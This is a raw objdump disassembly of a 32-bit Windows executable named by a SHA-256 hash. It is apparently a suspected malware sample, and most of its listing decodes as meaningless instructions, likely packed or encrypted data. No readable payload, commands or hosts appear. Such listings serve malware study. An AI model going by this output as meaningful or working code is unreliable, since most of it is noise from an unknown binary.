
5738e594b750e5f0a4942f71a3b8ba4f525b1ac739915b58ce41e6f28483a648.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x426ac2
  40100e:	mov    DWORD PTR ds:0x42a35d,0x1b
  401018:	cmp    DWORD PTR ds:0x42a35d,0x0
  40101f:	je     0x40155e
  401025:	cmp    DWORD PTR ds:0x42a35d,0x23
  40102c:	jne    0x40103b
  401032:	push   DWORD PTR [ebp-0x14]
  401035:	call   DWORD PTR ds:0x42501c
  40103b:	mov    ecx,DWORD PTR ds:0x42a35d
  401041:	dec    ecx
  401042:	mov    DWORD PTR ds:0x42a35d,ecx
  401048:	jmp    0x401018
  40104d:	or     DWORD PTR ds:0x42a3e5,ebx
  401053:	jmp    0x40155e
  401058:	int    0x3c
  40105a:	sar    DWORD PTR ds:0xccd1cdd1,1
  401060:	(bad)  
  401061:	push   eax
  401063:	sbb    al,0xb3
  401065:	fwait
  401066:	popf   
  401067:	addr16 js 0x4010e2
  40106a:	js     0x4010e4
  40106c:	push   0x7c
  40106e:	js     0x4010e8
  401070:	enter  0x3dd7,0xd5
  401074:	rcr    ebx,0xcf
  401077:	fld    st(4)
  401079:	pop    es
  40107a:	push   es
  40107b:	or     ecx,DWORD PTR [ebx]
  40107d:	bound  ecx,QWORD PTR [edx]
  40107f:	(bad)  
  401081:	bswap  edx
  401083:	and    al,bh
  401085:	sbb    bl,BYTE PTR [edi]
  401087:	inc    ecx
  401088:	bound  ecx,QWORD PTR [edx]
  40108a:	mov    bh,0xdd
  40108c:	or     bh,ch
  40108e:	mov    ebp,0x880bd0e3
  401093:	and    BYTE PTR [eax+0x1549a4f6],bh
  401099:	lods   eax,DWORD PTR ds:[esi]
  40109a:	fadd   DWORD PTR [eax+0x1f]
  40109d:	pusha  
  40109e:	out    dx,al
  40109f:	outs   dx,DWORD PTR ds:[esi]
  4010a0:	adc    ebx,DWORD PTR [ecx]
  4010a2:	sahf   
  4010a3:	add    dl,al
  4010a5:	dec    edx
  4010a6:	lods   al,BYTE PTR ds:[esi]
  4010a7:	pop    ebx
  4010a8:	sub    eax,0xad3ec6d9
  4010ad:	mov    WORD PTR [ebx],es
  4010af:	lds    esi,FWORD PTR [ebx-0x76243a00]
  4010b5:	adc    eax,0x3af3c19a
  4010bb:	xchg   ebx,eax
  4010bc:	icebp  
  4010bd:	dec    edi
  4010be:	loopne 0x401060
  4010c0:	dec    ecx
  4010c1:	call   DWORD PTR [edi-0x234ef85e]
  4010c7:	mov    ebp,0x5530ed4d
  4010cc:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  4010d3:	sbb    ebx,ecx
  4010d5:	xchg   esp,eax
  4010d6:	sub    esi,edx
  4010d8:	repz pop eax
  4010da:	(bad)  
  4010db:	out    0x42,al
  4010dd:	cli    
  4010de:	in     al,dx
  4010df:	xchg   esp,eax
  4010e0:	cmp    edi,ecx
  4010e2:	jbe    0x401149
  4010e4:	xlat   BYTE PTR ds:[ebx]
  4010e5:	sub    cl,ch
  4010e7:	add    al,0xe1
  4010e9:	sbb    DWORD PTR [ecx-0x60],ebx
  4010ec:	xor    eax,0x2696f0b
  4010f1:	adc    bh,BYTE PTR [ecx]
  4010f3:	fisttp QWORD PTR [eax+0x7f753256]
  4010f9:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010ff:	arpl   WORD PTR [ebp-0x23],dx
  401102:	rcl    BYTE PTR [ecx],1
  401104:	fistp  DWORD PTR [esi-0x1f]
  401107:	and    DWORD PTR [ecx-0x68],edi
  40110a:	inc    eax
  40110b:	push   ebx
  40110c:	aaa    
  40110d:	adc    eax,0x1c317733
  401112:	fstp   TBYTE PTR [eax]
  401114:	dec    edi
  401115:	repnz int 0xa6
  401118:	imul   eax,DWORD PTR [edi],0x54
  40111b:	sub    al,0x54
  40111d:	pushf  
  40111e:	add    ch,BYTE PTR [esi+0x5]
  401121:	xor    eax,0x9e9e980e
  401126:	cmp    eax,0xb64592dc
  40112b:	push   edi
  40112c:	xchg   ecx,eax
  40112d:	pop    ss
  40112e:	xor    cl,BYTE PTR [edi-0x68]
  401131:	and    cl,BYTE PTR [ebx+0x504952c8]
  401137:	stos   DWORD PTR es:[edi],eax
  401138:	dec    ebx
  401139:	cwde   
  40113a:	sub    ecx,eax
  40113c:	cmp    ah,dh
  40113e:	daa    
  40113f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401140:	add    cl,dl
  401142:	mov    dl,0x34
  401144:	or     BYTE PTR [esi+0x31d4df59],cl
  40114a:	pop    edx
  40114b:	pop    ss
  40114c:	jno    0x401119
  40114e:	jno    0x401158
  401150:	ds pop esp
  401152:	outs   dx,DWORD PTR ds:[esi]
  401153:	mov    BYTE PTR [ebp+0x3b6a438a],bl
  401159:	data16 xor dl,BYTE PTR [esi+0x130113b1]
  401160:	fs test eax,0x5b64cb0d
  401166:	aas    
  401167:	(bad)  
  401168:	cli    
  401169:	jo     0x401155
  40116b:	in     al,0x66
  40116d:	bound  ebx,QWORD PTR gs:[ebx]
  401170:	adc    ebx,DWORD PTR [eax+edx*4+0x7b]
  401174:	lds    ebp,FWORD PTR [ebx]
  401176:	dec    esp
  401177:	add    eax,0x40a042f5
  40117c:	dec    esp
  40117d:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40117f:	mov    ch,0x90
  401181:	push   cs
  401182:	xchg   esi,eax
  401183:	or     DWORD PTR [esi],esi
  401185:	push   ss
  401186:	mov    edx,0x6e5c6138
  40118b:	jae    0x4011ea
  40118d:	adc    al,BYTE PTR es:[edx*4+0x332fd450]
  401195:	mov    BYTE PTR [ecx-0x52],dh
  401198:	ficomp WORD PTR [esi+ebx*1+0x3e]
  40119c:	push   DWORD PTR [edi-0x47c41995]
  4011a2:	sub    BYTE PTR [edi+0x1fdc8eb3],dh
  4011a8:	xor    eax,0xf7951c97
  4011ad:	popf   
  4011ae:	sub    bl,BYTE PTR [edx+0x7447f574]
  4011b4:	addr16 addr16 add esp,edx
  4011b8:	mov    dl,0xe6
  4011ba:	sub    BYTE PTR [edi+eax*4-0x5e148a6d],0xf3
  4011c2:	in     eax,0x6e
  4011c4:	stc    
  4011c5:	sbb    ebx,DWORD PTR [esp+edi*8-0x1d814647]
  4011cc:	ins    DWORD PTR es:[edi],dx
  4011cd:	xchg   edi,eax
  4011ce:	cli    
  4011cf:	mov    ebp,0xc16867c6
  4011d4:	pop    esi
  4011d5:	mov    ebp,0x4be01916
  4011da:	mov    ah,0xbd
  4011dc:	cmp    eax,0x34f26f59
  4011e1:	das    
  4011e2:	inc    esp
  4011e3:	mov    ecx,DWORD PTR [ecx-0xa7c74d7]
  4011e9:	mov    eax,0xe343c79f
  4011ee:	ins    BYTE PTR es:[edi],dx
  4011ef:	lods   al,BYTE PTR ds:[esi]
  4011f0:	xchg   ebp,eax
  4011f1:	jno    0x40126b
  4011f3:	cmp    cl,bl
  4011f5:	(bad)  
  4011f6:	cmp    DWORD PTR [ebx-0x16786bf2],ecx
  4011fc:	call   0x19546cb0
  401201:	push   ss
  401202:	pop    edi
  401203:	add    DWORD PTR [eax],ebx
  401205:	pushf  
  401206:	cmc    
  401207:	lods   al,BYTE PTR ds:[esi]
  401208:	cli    
  401209:	retf   0x85d2
  40120c:	push   0x83e277ff
  401211:	sub    esi,DWORD PTR [edi+0x3f44cc29]
  401217:	sbb    esi,DWORD PTR [edi]
  401219:	dec    ecx
  40121a:	jmp    0x2f56d8c7
  40121f:	dec    edx
  401220:	test   BYTE PTR [ebp+edi*1+0x6e],ah
  401224:	ficom  DWORD PTR [esi+0x1d]
  401227:	jns    0x4011cc
  401229:	outs   dx,DWORD PTR ds:[esi]
  40122a:	mov    edx,0x520f40d5
  40122f:	push   esi
  401230:	pop    edi
  401231:	mov    dh,0x1
  401233:	out    0x40,eax
  401235:	mov    dh,0xc6
  401237:	fisub  DWORD PTR [eax+0x19]
  40123b:	xor    DWORD PTR ds:0x284890ec,eax
  401241:	adc    eax,0x1d2d0164
  401246:	cmp    DWORD PTR [ecx-0x44],eax
  401249:	cmp    BYTE PTR [esi+0x114f1efd],0xda
  401250:	mov    edx,0x29c6f90b
  401255:	ret    
  401256:	sub    al,0x6e
  401258:	sub    eax,0xa78683e8
  40125d:	outs   dx,DWORD PTR ds:[esi]
  40125e:	sar    esp,cl
  401260:	sar    edx,1
  401262:	enter  0xb0fd,0x76
  401266:	adc    al,0x3b
  401268:	xchg   edi,eax
  401269:	dec    esi
  40126a:	xor    eax,0xa8fc1846
  40126f:	add    ch,ah
  401271:	jmp    0xe762176b
  401276:	mov    al,ds:0xefde8b49
  40127b:	add    BYTE PTR [ebp-0x7b],dh
  40127e:	xchg   ecx,eax
  40127f:	arpl   bp,cx
  401281:	mov    al,ds:0x72fd238a
  401286:	adc    ch,0x45
  401289:	dec    esi
  40128a:	adc    dl,ah
  40128c:	mov    esp,fs
  40128e:	int3   
  40128f:	cmp    ch,BYTE PTR ds:0x10098de2
  401295:	cld    
  401296:	add    cl,BYTE PTR [ebx+0x74]
  401299:	jnp    0x40122b
  40129b:	push   edx
  40129c:	loopne 0x401272
  40129e:	adc    DWORD PTR [eax],edi
  4012a0:	popa   
  4012a1:	fisttp WORD PTR [ecx]
  4012a3:	test   bh,0x8b
  4012a6:	xor    BYTE PTR [edi+eax*2+0x442fedab],0x42
  4012ae:	sbb    cl,BYTE PTR [edx-0x2282f32d]
  4012b4:	or     eax,0xfef6cda0
  4012b9:	rcl    DWORD PTR [ecx],0xbe
  4012bc:	out    dx,al
  4012bd:	loope  0x4012fd
  4012bf:	scas   al,BYTE PTR es:[edi]
  4012c0:	xchg   BYTE PTR [eax+0x58b2f4b],al
  4012c6:	shr    ch,1
  4012c8:	out    0x3,al
  4012ca:	and    bh,BYTE PTR [eax-0x4028c89f]
  4012d0:	(bad)  
  4012d1:	idiv   DWORD PTR [edi+0x4a464ffe]
  4012d7:	mov    eax,ds:0x2907f06a
  4012dc:	inc    ecx
  4012dd:	jne    0x40128e
  4012df:	loop   0x40135b
  4012e1:	ror    DWORD PTR [esi+0x21fd04bf],1
  4012e7:	retf   
  4012e8:	mov    ebp,0xb59d191d
  4012ed:	mov    edi,0xa75e36d9
  4012f2:	test   eax,0x4a41adc2
  4012f7:	mov    bl,BYTE PTR [ebp-0x15]
  4012fa:	mov    ecx,0x187551b0
  4012ff:	pop    es
  401300:	mov    edi,0x9302a2ea
  401305:	retf   0xc65e
  401308:	add    eax,0xf130a12e
  40130d:	or     bl,BYTE PTR [edx+0x1354e9e3]
  401313:	sbb    BYTE PTR ds:0x9638ae0e,bl
  401319:	test   DWORD PTR [ecx+esi*2+0x1e],edi
  40131d:	test   DWORD PTR [ebx-0x62dcd134],edx
  401323:	or     esi,DWORD PTR [ebp+eax*2+0x65]
  401327:	cli    
  401328:	(bad)  
  401329:	sbb    al,0x47
  40132b:	(bad)  
  40132c:	cmova  esi,edx
  40132f:	mov    DWORD PTR [ebp+0x1477b027],edi
  401335:	xchg   esi,edx
  401337:	inc    ecx
  401338:	dec    ecx
  401339:	inc    BYTE PTR [ecx+ebp*2]
  40133c:	fisub  WORD PTR [ebp+0xf]
  40133f:	jns    0x4013b1
  401341:	fiadd  DWORD PTR [ecx]
  401343:	xor    eax,0xc3b95f4c
  401348:	repz test BYTE PTR [edi],0xfd
  40134c:	hlt    
  40134d:	aas    
  40134e:	(bad)  
  401350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401351:	jae    0x401380
  401353:	and    eax,0x206cfae6
  401358:	pop    esi
  401359:	lds    edi,FWORD PTR [ecx-0x7e]
  40135c:	dec    esp
  40135d:	fcmovnb st,st(7)
  40135f:	cdq    
  401360:	inc    edx
  401361:	jo     0x401353
  401363:	nop
  401364:	pop    edx
  401365:	sbb    eax,0x7279c12c
  40136a:	xlat   BYTE PTR ds:[ebx]
  40136b:	mov    al,0x2
  40136d:	push   ss
  40136e:	mov    esp,0xd53f89bc
  401373:	pop    ebp
  401374:	inc    esi
  401375:	mov    dh,0x8b
  401377:	fstp   QWORD PTR [ebx+0x340f5586]
  40137d:	sbb    eax,0x79dff6f6
  401382:	xor    cl,dl
  401384:	cli    
  401385:	adc    DWORD PTR [ebx],edi
  401387:	or     eax,0x685919d0
  40138c:	push   eax
  40138d:	mov    eax,ds:0x42b77414
  401392:	mov    cl,0x46
  401394:	add    bh,ah
  401396:	xor    al,0x21
  401398:	scas   eax,DWORD PTR es:[edi]
  401399:	sbb    cl,bl
  40139b:	cwde   
  40139c:	retf   0x994b
  40139f:	(bad)
  4013a4:	or     ah,BYTE PTR [esi+0x5915770b]
  4013aa:	addr16 mov edx,0xf6c12486
  4013b0:	mov    ds:0x14d84254,eax
  4013b5:	aas    
  4013b6:	add    ebp,DWORD PTR [ebp+edx*2+0x7d]
  4013ba:	in     eax,0xc4
  4013bc:	pop    ss
  4013bd:	ss (bad) 
  4013bf:	push   cs
  4013c0:	push   ds
  4013c1:	int3   
  4013c2:	scas   al,BYTE PTR es:[edi]
  4013c3:	je     0x4013af
  4013c5:	retf   
  4013c6:	lods   eax,DWORD PTR ds:[esi]
  4013c7:	in     eax,0xf1
  4013c9:	mov    ecx,0x5bf128c3
  4013ce:	mov    al,0xad
  4013d0:	in     al,dx
  4013d1:	or     al,0x59
  4013d3:	and    DWORD PTR [esi+0x7b8497ca],0x7f224f4b
  4013dd:	inc    DWORD PTR [esp+esi*4+0x67]
  4013e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013e2:	scas   eax,DWORD PTR es:[edi]
  4013e3:	xor    DWORD PTR [ecx-0x45],edx
  4013e6:	mov    ebx,0xb3d6871
  4013eb:	nop
  4013ec:	push   0x74c48c18
  4013f1:	aad    0xc1
  4013f3:	sahf   
  4013f4:	repnz aad 0x1e
  4013f7:	inc    ebx
  4013f8:	push   es
  4013f9:	adc    ch,BYTE PTR [eax]
  4013fb:	or     al,BYTE PTR [ecx+ebx*8-0x37]
  4013ff:	inc    edi
  401400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401401:	jae    0x401399
  401403:	sub    dh,BYTE PTR [ecx-0x389789a0]
  401409:	mov    dl,0xe5
  40140b:	push   esp
  40140c:	cmp    ebx,ebx
  40140e:	xchg   edi,eax
  40140f:	mov    ecx,0x40841724
  401414:	call   0xefe1:0x8c67df16
  40141b:	and    DWORD PTR [edx+0x2e],ebx
  40141e:	pop    edx
  40141f:	mov    bl,BYTE PTR [esi]
  401421:	mov    ecx,ds
  401423:	cmp    edi,esi
  401425:	sub    eax,0x7a69b841
  40142a:	inc    ebx
  40142b:	popf   
  40142c:	xor    eax,0xc54b5362
  401431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401432:	xchg   esp,eax
  401433:	pop    eax
  401434:	add    BYTE PTR [edi],ch
  401436:	push   0x7734892
  40143b:	int    0x21
  40143d:	test   BYTE PTR [edx],bh
  40143f:	popa   
  401440:	or     edx,DWORD PTR [ecx-0x2dc8ec6d]
  401446:	add    eax,0x6cf5a802
  40144b:	fild   WORD PTR [eax-0x4c]
  40144e:	neg    BYTE PTR [edx+0x631e35cc]
  401454:	add    BYTE PTR [ecx-0x6e],0x2c
  401458:	lea    esi,[eax-0x44]
  40145b:	xor    BYTE PTR [eax-0x69],dl
  40145e:	mov    ss,WORD PTR [esi-0x4e]
  401461:	call   0x413d:0x4f29f7ad
  401468:	addr16 xor eax,0x88c0ff4f
  40146e:	scas   eax,DWORD PTR es:[edi]
  40146f:	stos   DWORD PTR es:[edi],eax
  401470:	arpl   cx,cx
  401472:	dec    ecx
  401473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401474:	jge    0x40147d
  401476:	push   0x4f
  401478:	int3   
  401479:	cmp    eax,edx
  40147b:	push   es
  40147c:	sbb    al,0x9f
  40147e:	test   al,0xb4
  401480:	dec    edx
  401481:	xchg   edi,eax
  401482:	nop
  401483:	aad    0x7c
  401485:	inc    ecx
  401486:	sub    al,0x47
  401488:	fwait
  401489:	cmc    
  40148a:	ja     0x4014d8
  40148c:	hlt    
  40148d:	int    0x64
  40148f:	pop    edx
  401490:	or     DWORD PTR [eax-0x2d],eax
  401493:	xchg   ebx,eax
  401494:	fdivr  QWORD PTR [ecx-0x69]
  401497:	mov    dl,0x6c
  401499:	icebp  
  40149a:	aaa    
  40149b:	and    DWORD PTR [esi-0x25],edi
  40149e:	mov    dh,0xcb
  4014a0:	sbb    BYTE PTR [edx+ebx*1+0x6043ea66],dl
  4014a7:	into   
  4014a8:	fimul  DWORD PTR [edx-0x29]
  4014ab:	jnp    0x4014f1
  4014ad:	sbb    DWORD PTR [edi+0x56],0xfffffff7
  4014b1:	dec    esp
  4014b2:	pop    ebx
  4014b3:	xchg   esp,eax
  4014b4:	retf   
  4014b5:	push   0xbeeaef76
  4014ba:	sbb    eax,0x33bf358a
  4014bf:	jge    0x40144a
  4014c1:	pop    edi
  4014c2:	push   ebp
  4014c3:	(bad)  
  4014c4:	stos   DWORD PTR es:[edi],eax
  4014c5:	or     BYTE PTR [ebx-0x64570c14],0xc2
  4014cc:	pop    eax
  4014cd:	add    BYTE PTR [edx-0x7a],ah
  4014d0:	xor    al,0xb1
  4014d2:	fwait
  4014d3:	xor    edx,DWORD PTR [edi]
  4014d5:	mov    ah,0xda
  4014d7:	sti    
  4014d8:	dec    esi
  4014d9:	lahf   
  4014da:	inc    esi
  4014db:	xlat   BYTE PTR ds:[ebx]
  4014dc:	mov    esp,0xe57c7f7a
  4014e1:	mov    cl,0x9c
  4014e3:	mov    al,0x99
  4014e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014e6:	mov    esi,0x5488dba5
  4014eb:	mov    esp,0xb6a8f2b8
  4014f0:	or     al,0x46
  4014f2:	ds mov esi,0x7d795622
  4014f8:	test   BYTE PTR [eax+0x132af996],cl
  4014fe:	sub    BYTE PTR [edi],dh
  401500:	das    
  401501:	out    dx,al
  401502:	adc    cl,BYTE PTR [edx-0x4a2328c2]
  401508:	xchg   ebx,eax
  401509:	rol    DWORD PTR [ebx],cl
  40150b:	mov    al,0x24
  40150d:	dec    ebx
  40150e:	xor    DWORD PTR [edi],eax
  401510:	rol    esp,cl
  401512:	mov    al,ds:0xdf45d086
  401517:	mov    ch,0x50
  401519:	lock or bl,BYTE PTR [esi]
  40151c:	jne    0x4014b6
  40151e:	jecxz  0x4014a6
  401520:	or     esi,DWORD PTR [ebx+0x44ab81cc]
  401526:	inc    esp
  401527:	icebp  
  401528:	in     al,dx
  401529:	loop   0x4014bf
  40152b:	pusha  
  40152c:	sahf   
  40152d:	(bad)  
  40152f:	jae    0x4014f3
  401531:	mov    edx,0x6973390
  401536:	sbb    edi,DWORD PTR [edx-0x1cc1f008]
  40153c:	mov    ah,0xbc
  40153e:	pop    ebx
  40153f:	dec    esp
  401540:	mov    ebp,0xe9df927b
  401545:	or     BYTE PTR [eax+0x7d7eab4f],0x7b
  40154c:	rcl    dl,1
  40154e:	adc    eax,0x95c018ba
  401553:	loope  0x401528
  401555:	pop    esi
  401556:	sahf   
  401557:	lods   al,BYTE PTR ds:[esi]
  401558:	inc    DWORD PTR [esi]
  40155a:	fucom  st(5)
  40155c:	sub    DWORD PTR [edx],edx
  40155e:	mov    DWORD PTR [ebp-0x18],eax
  401561:	mov    eax,ds:0x426bd2
  401566:	mov    DWORD PTR [ebp-0x48],eax
  401569:	sbb    DWORD PTR ds:0x42a3ed,edx
  40156f:	mov    DWORD PTR [ebp-0x10],0xf89c8538
  401576:	mov    DWORD PTR [ebp-0x1c],0xf89c8539
  40157d:	mov    ecx,DWORD PTR ds:0x42a391
  401583:	xor    DWORD PTR ds:0x42a39d,ecx
  401589:	mov    eax,DWORD PTR [ebp-0x10]
  40158c:	and    DWORD PTR ds:0x42a2c1,0x692a
  401596:	push   ebx
  401597:	sub    ecx,ecx
  401599:	jmp    0x401aa4
  40159e:	enter  0xc8d0,0xd7
  4015a2:	rcl    bh,1
  4015a4:	xlat   BYTE PTR ds:[ebx]
  4015a5:	xlat   BYTE PTR ds:[ebx]
  4015a6:	dec    ebx
  4015a7:	xor    BYTE PTR [edi],bl
  4015a9:	pop    esi
  4015aa:	mov    eax,ds:0x6a978dd4
  4015af:	jl     0x401629
  4015b1:	js     0x40161d
  4015b3:	jl     0x40162d
  4015b5:	js     0x4015d4
  4015b7:	and    DWORD PTR [esi+0x2e],esi
  4015ba:	rcl    DWORD PTR [eax],1
  4015bc:	cmp    bl,ah
  4015be:	mov    cl,0x90
  4015c0:	pop    ss
  4015c1:	sub    BYTE PTR [edi-0x33a5ba48],ah
  4015c7:	fisttp WORD PTR [eax+0x5f688b6d]
  4015cd:	dec    esp
  4015ce:	and    eax,0xabb7c95c
  4015d3:	mov    ds:0x335298a2,al
  4015d8:	mov    edx,0xffbe4285
  4015dd:	cmp    BYTE PTR [ebp-0x4e],al
  4015e0:	sbb    eax,0xe65372e0
  4015e5:	xchg   DWORD PTR [edi-0x76],ebx
  4015e8:	daa    
  4015e9:	push   ebp
  4015ea:	mov    bl,bh
  4015ec:	hlt    
  4015ed:	and    BYTE PTR [ecx-0x2d],0x85
  4015f1:	jmp    0x483d:0x2a257140
  4015f8:	mov    bl,0x21
  4015fa:	sbb    DWORD PTR [eax+ebp*2-0x159dc4],esi
  401601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401602:	ret    
  401603:	jbe    0x401611
  401605:	sbb    BYTE PTR [esp+eax*1-0x5e],dh
  401609:	pmullw mm7,QWORD PTR [esi-0x1159d830]
  401610:	or     al,0x3f
  401612:	adc    al,0xc0
  401614:	scas   al,BYTE PTR es:[edi]
  401615:	jb     0x40168d
  401617:	mov    dl,0x58
  401619:	cmp    dh,BYTE PTR [eax]
  40161b:	add    al,0x50
  40161d:	sub    al,0x59
  40161f:	and    eax,0x146714bd
  401624:	xor    ah,BYTE PTR [ebp+0x2fe922ad]
  40162a:	mov    ecx,es
  40162c:	arpl   cx,bp
  40162e:	xchg   ecx,eax
  40162f:	cmp    esi,DWORD PTR [ebp+ebx*2-0x2fc434d9]
  401636:	lock jns 0x40168d
  401639:	and    BYTE PTR [ebx-0x5c18a272],al
  40163f:	xor    DWORD PTR [eax-0x2d60c1fd],ebx
  401645:	in     eax,dx
  401646:	repnz and al,0xba
  401649:	cmp    bh,BYTE PTR [eax-0x482a7999]
  40164f:	push   ebx
  401650:	cmp    ebx,esi
  401652:	in     al,0xc2
  401654:	xlat   BYTE PTR gs:[ebx]
  401656:	mul    DWORD PTR [edx-0x1d]
  401659:	hlt    
  40165a:	sahf   
  40165b:	into   
  40165c:	sbb    eax,0x438b4a89
  401661:	fsub   DWORD PTR [ebx+0x65]
  401664:	inc    edi
  401665:	sti    
  401666:	mov    al,ds:0xd7f53e50
  40166b:	(bad)  ds:0x882ddd96
  401671:	sahf   
  401672:	push   ds
  401673:	xor    eax,0xf0c112b
  401678:	rol    BYTE PTR [edx],cl
  40167a:	mov    ch,0x37
  40167c:	push   edx
  40167d:	xchg   ebp,eax
  40167e:	push   cs
  40167f:	jo     0x40163f
  401681:	fxch   st(2)
  401683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401684:	dec    DWORD PTR [ecx]
  401686:	gs inc esi
  401688:	pop    ds
  401689:	xchg   edi,eax
  40168a:	mov    ebx,0xa9c4b6e5
  40168f:	mov    ecx,0xb5603984
  401694:	mov    bh,0x85
  401697:	ins    DWORD PTR es:[edi],dx
  401698:	pop    ss
  401699:	int    0x67
  40169b:	enter  0xa1cc,0xa9
  40169f:	ins    BYTE PTR es:[edi],dx
  4016a0:	bound  eax,QWORD PTR [edi+0x33b8669f]
  4016a6:	loop   0x4016ea
  4016a8:	push   0xa0ea2bab
  4016ad:	pop    edx
  4016ae:	aaa    
  4016af:	rcl    BYTE PTR [edi+0x42],cl
  4016b2:	mov    ah,0x2b
  4016b4:	or     DWORD PTR [edx-0x3d],ebp
  4016b7:	outs   dx,BYTE PTR ds:[esi]
  4016b8:	jg     0x4016a0
  4016ba:	cmp    ah,BYTE PTR [esi]
  4016bc:	(bad)  
  4016be:	xlat   BYTE PTR ds:[ebx]
  4016bf:	lahf   
  4016c0:	mov    eax,0xaa9d160f
  4016c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016c6:	cld    
  4016c7:	scas   eax,DWORD PTR es:[edi]
  4016c8:	push   edi
  4016c9:	jmp    0x9e0f8f3e
  4016ce:	not    BYTE PTR [ebx-0x7c]
  4016d1:	pop    es
  4016d2:	mov    ebx,0x384126c3
  4016d7:	jmp    0x764b7777
  4016dc:	in     eax,0x35
  4016de:	call   0x6c0c:0x3a835c
  4016e5:	mov    ds:0x473f6386,al
  4016ea:	retf   0xde94
  4016ed:	mov    esi,0xf246e9c0
  4016f2:	sbb    al,0xf6
  4016f4:	test   ecx,ebx
  4016f6:	push   esp
  4016f7:	or     al,0xb9
  4016f9:	xlat   BYTE PTR ds:[ebx]
  4016fa:	pop    eax
  4016fb:	test   eax,0x850b4562
  401700:	or     esi,DWORD PTR [ebx]
  401702:	mov    al,0x67
  401704:	sub    bl,BYTE PTR [esi+eax*2]
  401707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401708:	inc    eax
  401709:	mov    esi,0xf2283065
  40170e:	mov    BYTE PTR [esi],ah
  401710:	jg     0x40171d
  401712:	int3   
  401713:	mov    edi,0x2f0a258f
  401718:	mov    al,0x4e
  40171a:	loope  0x401737
  40171c:	pop    ebp
  40171d:	add    BYTE PTR [ecx],ch
  40171f:	rcr    BYTE PTR [edx+0x50b3cf1c],1
  401725:	lods   al,BYTE PTR ds:[esi]
  401726:	xor    dl,BYTE PTR [esi+eax*2]
  401729:	test   DWORD PTR [edi-0x1676cfad],ebp
  40172f:	repnz pop ecx
  401731:	or     al,0xb1
  401733:	fcom   DWORD PTR ds:0x73ae4720
  401739:	fs inc ecx
  40173b:	fild   WORD PTR [edx+0x7e038de5]
  401741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401742:	les    esi,FWORD PTR [ecx+0x48]
  401745:	lods   eax,DWORD PTR ds:[esi]
  401746:	int    0x1c
  401748:	push   ecx
  401749:	sub    ebp,esp
  40174b:	fcomp  QWORD PTR [ebp+0x15]
  40174e:	fisttp DWORD PTR [eax]
  401750:	sbb    al,0x53
  401752:	shr    DWORD PTR [edi+0x84df03a],1
  401758:	les    ecx,FWORD PTR [edi-0x2b61db43]
  40175e:	sub    eax,edx
  401760:	fisub  DWORD PTR [ebx]
  401762:	in     eax,dx
  401763:	mov    al,0x43
  401765:	mov    al,0x87
  401767:	dec    edx
  401768:	add    al,0x1b
  40176a:	mov    al,0xb6
  40176c:	pop    ecx
  40176d:	pop    ebx
  40176e:	or     esi,eax
  401770:	jmp    0xf3bff642
  401775:	out    dx,al
  401776:	enter  0x9d8a,0x24
  40177a:	xchg   esi,eax
  40177b:	cdq    
  40177c:	fmul   QWORD PTR [eax+0x56]
  40177f:	les    esi,FWORD PTR [edi-0x41]
  401782:	add    ah,BYTE PTR [eax-0x71497e27]
  401788:	fisubr DWORD PTR [edx+0x6fb55250]
  40178e:	jne    0x40174a
  401790:	call   0xb53cae88
  401795:	mov    eax,0x5e7e2496
  40179a:	sbb    al,0xaa
  40179c:	or     DWORD PTR [edi+0x7622aa6],eax
  4017a2:	imul   BYTE PTR [ecx-0xf95315c]
  4017a8:	mov    ebx,0xde133476
  4017ad:	jg     0x4017b1
  4017af:	add    eax,0x91c306b9
  4017b4:	popa   
  4017b5:	shl    eax,0xf9
  4017b8:	sub    BYTE PTR [eax+0x30],ch
  4017bb:	cmp    bx,sp
  4017be:	into   
  4017bf:	(bad)  
  4017c1:	in     al,dx
  4017c2:	sub    dl,BYTE PTR [eax+0x3c]
  4017c5:	fwait
  4017c6:	xchg   ecx,eax
  4017c7:	mov    DWORD PTR [esp+eax*2+0x36a1e871],ebp
  4017ce:	test   eax,0xd86eea16
  4017d3:	xor    eax,0xfc356bb9
  4017d8:	repz cmp BYTE PTR [esi+0x42f722fe],dl
  4017df:	cmp    bh,bl
  4017e1:	xor    DWORD PTR [esi-0x30],ebx
  4017e4:	push   esi
  4017e5:	add    BYTE PTR [ebp+ecx*1+0x41],bl
  4017e9:	inc    ebp
  4017ea:	loop   0x401844
  4017ec:	or     al,0x51
  4017ee:	test   BYTE PTR [esi-0x68c049e1],bl
  4017f4:	or     DWORD PTR [edx+0x79fc381f],ecx
  4017fa:	int3   
  4017fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017fc:	(bad)  
  4017fd:	adc    ebx,DWORD PTR ds:0x7de2bfb3
  401803:	xchg   edi,eax
  401804:	mov    eax,ds:0x4653ff57
  401809:	and    ah,BYTE PTR [eax+0x55a6379e]
  40180f:	cdq    
  401810:	inc    edx
  401811:	ret    
  401812:	sub    BYTE PTR [esp+ebp*2],al
  401815:	adc    eax,0x8a63390
  40181a:	mov    bh,0x66
  40181c:	stos   DWORD PTR es:[edi],eax
  40181d:	imul   ebp,DWORD PTR ds:0x45298cce,0xffffff80
  401824:	xchg   DWORD PTR [edx+0x7],edx
  401827:	test   eax,0xdd6579f2
  40182c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40182d:	jmp    0x4017bf
  40182f:	xor    BYTE PTR [ebx+0x69],ah
  401832:	inc    esi
  401833:	jb     0x40180a
  401835:	mov    BYTE PTR ds:0x5e626414,al
  40183b:	test   BYTE PTR [edi-0x6d],dh
  40183e:	xor    DWORD PTR [edx],0xffffffab
